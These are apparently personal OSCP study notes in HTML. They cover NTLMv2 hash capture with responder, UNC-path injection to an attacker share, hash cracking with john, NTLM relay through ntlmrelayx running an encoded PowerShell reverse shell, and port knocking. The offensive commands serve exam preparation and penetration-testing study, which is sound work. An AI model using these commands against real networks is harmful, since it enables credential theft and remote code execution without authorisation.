<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Network Attacks</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Network Attacks</h1><br/><p><h1>OSCP Warning</h1></p><p>Poisoning is not allowed! Careful with responder (use -A) &amp; other tools!</p><p></p><p>(OSCP 128-129) <span style="color:#ff0000;">Even if some hosts in the Net have SMB Signing Enabled, others may not</span>. Check via <em>enum4linux-ng -A</em></p><p></p><p><h1>Signing Enforcement</h1></p><p>Even if SMB signing is disabled, it may not be enforced. “Microsoft does not enforce SMB signing on any workstations, but they do enforce it on servers.” -Heath Adams (David Bombal interview)</p><p></p><p><a name="capture ntlm"></a><h1>Capture NTLMv2 Hash</h1></p><p>Works regardless of whether or not SMB Signing is enabled </p><p></p><p><h2>Trigger Auth</h2></p><p>After setting up reponder, trigger by interacting with Atker&#39;s FS (e.g by fetching nonexistent resource). Look for vectors-</p><p><ul><li><span style="color:#3584e4;"> RCE</span>: <strong>dir \\Atker\share </strong>      OR          <strong>\\\\Atker\\share</strong>               (e.g via Webshell maybe?)</li></ul></p><p><ul><li><span style="color:#3584e4;">WebApp</span>: <span style="color:#ff0000;">File Upload</span>, <span style="color:#ff0000;">RFI</span>, <span style="color:#ff0000;">Form Field</span>, or anything else that&#39;d interact with Atker&#39;s FS (e.g WordPress Backup Plugin). Enter UNC Path for non-existent file, like<strong> \\Atker\share\fake.txt </strong>or <strong>\\\\Atker\\share\\fake.txt </strong>or <strong>smb://Atker/share/fake.txt</strong></li></ul></p><p></p><p>For ex- Form Field for a<span style="color:#ff0000;"> Website URL</span></p><p><ul><li><span style="color:#3584e4;">SQLi</span>: Some payloads <a href="SQL--DBMS--MSSQL_16.html#trigger">trigger</a> SMB Connection (OSCP 93-94). [idk if this is on OSCP]</li></ul></p><p><ul><li><span style="color:#3584e4;">Other Services</span>: Services like Redis also trigger NTLMv2 Auth (Win 49-50). [Likely not on OSCP]</li></ul></p><p><ul><li><span style="color:#3584e4;">SMB</span>: Maybe auth would be triggered if you connected to target&#39;s SMB server &amp; used that to upload a non-existent file (Try w/ &amp; w/o UNC Path, like <strong>/home/asura/fake.txt </strong>&amp; <strong> \\Atker\share\fake.txt</strong>). Just speculation.</li></ul></p><p> </p><p><h2> Capture Auth Attempt</h2></p><p>Sometimes have had issues with responder, can use a normal SMB server to see hash as well.</p><p></p><p>If <strong>responder</strong> has <span style="color:#ff0000;">prev captured their hash</span> it&#39;ll <span style="color:#ff0000;">ignore it </span>unless you use <strong>-v</strong></p><p></p><p><span style="color:#060f94;text-decoration:underline;">Tip</span>: If you have a shell as a user, but don&#39;t know their passwd, you can use this method to retrieve their hash.</p><p> </p><p> impacket-smbserver share . -smb2support</p><p> </p><p> <em>sudo responder -A -I tun0</em> 						(assuming thats the interface used for capture) </p><p> </p><p> May need to <span style="color:#ff0000;">assign a specific Domain Name to the IP</span> in <strong>/etc/hosts</strong> before triggering hash capture? Offsec exercise said this was “Important.” If you find a Domain Name from <em>enum4linux-ng, nmap -A</em>, etc, add it to be safe.</p><p> </p><p><h3>Output</h3></p><p> <strong>username::domain:</strong> (etc) <span style="color:#ff0000;">copy everythhing starting at the username</span>. Should be be multiple lines.</p><p> </p><p><h2>Crack</h2></p><p> <em>john --format=netntlmv2 --wordlist=</em>/usr/share/wordlists/rockyou.txt -<em>-rules=best64 hash_file.txt </em>(rule is optional)</p><p></p><p><h1>Relay Attack (SMB Signing is Disabled)</h1></p><p>Combination of PtH Attack and aforementioned Capture NTLMv2 Hash (CTF B 37-39 [Example])</p><p></p><p><h2>Prerequisites</h2></p><p></p><p><h3>Relay Limitations</h3><ul><li>SMB <span style="color:#ff0000;">Signing needs to be disabled</span> (for both the initiator &amp; the target, I think). Even if SMB Signing is Enabled for other hosts in the Dom, doesn&#39;t mean thats the case for every host. Can verify with <em>enum4linux-ng -A</em></li></ul></p><p><ul><li>Supports SMB1 &amp;/or SMB2 dialects (don&#39;t think this relay server supports SMB3). Can verify with <em>enum4linux-ng -A</em></li></ul></p><p></p><p><a name="PtH Limitations"></a><h3>PtH Limitations</h3></p><p>[OSCP 127]</p><p></p><p><span style="color:#ff0000;">Restrictions don&#39;t apply when operating within an AD env</span>, at least not when using Domain Accounts as opposed to Local Accounts [idk]? Outside of AD env, the following applies to  modern Win-</p><p><ul><li>Allegedly, the acct needs admin privs on the 2nd target (host you&#39;re Passing the Hash to) to get RCE. If the acct used isn&#39;t the built-in Local <span style="color:#3584e4;">Administrator</span>, the target host may also needs to be config in a certain way to get RCE.</li></ul></p><p><ul><li>Other than the built-in Local <span style="color:#3584e4;">Administrator</span>, users in the <span style="color:#33d17a;">Local Administrator group</span> have UAC Remote Restrictions enabled by def (since Windows Vista) which prevent SW or cmds from running with admin rights on remote sys. (I think you may still be able to get unprivileged RCE on the sys?)</li></ul></p><p></p><p><h3>Target Account</h3><ul><li>The acct used for the auth attempt must also exist on the target maching (i.e Same username &amp; password). It&#39;s not uncommon for <span style="color:#ff0000;">★multiple/all Local </span><span style="color:#3584e4;">Administrator</span><span style="color:#ff0000;"> accts in a Domain to be setup with same passwd★</span></li></ul></p><p><ul><li>An acct may&#39;ve diff privs on the target machine, so this could end up being <a href="PrivEsc_8.html">PrivEsc</a></li></ul></p><p></p><p><h2>Relay Server</h2><ul><li>Specify Target that you want to relay/pivot to, &amp; a payload to execute on it (<a href="PrivEsc--Windows_9.html#PS Payload">Encoded PS</a> &lt;- <a href="file:///mnt/code/code/windows/powershell/r_shell.txt">file</a> accessible after <em>sudo mount /dev/sdc2 /mnt</em> )</li></ul></p><p><ul><li><span style="color:#ff0000;">Ensure port 445 isn&#39;t in use</span>, since your relay server will want to use it</li></ul></p><p></p><p><em>sudo impacket-ntlmrelayx --no-http-server -smb2support -t TARGET_IP -c “powershell -enc ENCODED”</em></p><p></p><p><h3>Safety Measures</h3></p><p>After getting shell, create a <a href="General_6.html#Backup Shell">backup shell</a>. If the OG shell freezes, may be unable to get it again without reverting/rebooting target machine!</p><p></p><p><h1>Port Knocking</h1></p><p>An obscure technique that&#39;s more common in CTFs than IRL. It typically involves quickly connecting to a sequence of ports (like a password) in order to gain access to a previously inaccessible port / service (<strong>filtered / closed</strong> or it said <strong>open</strong> but dropped connections).</p><p></p><p>You may be able to sniff Network Traffic in order to assertain the port sequence.</p><p></p><p><h2>Knocking</h2></p><p>After knocking perform a full Nmap scan (TCP &amp; UDP) to help you determine what may&#39;ve changed.</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Note</span>: May need to re-knock in case of Network issue, or ports re-closing (e.g after a set period of time)</p><p></p><p><em>for x in 42 1337 10420 6969 63000; do nmap -Pn --host-timeout 201 --max-retries 0 -p $x IP; done</em></p></div>
</body>
</html>
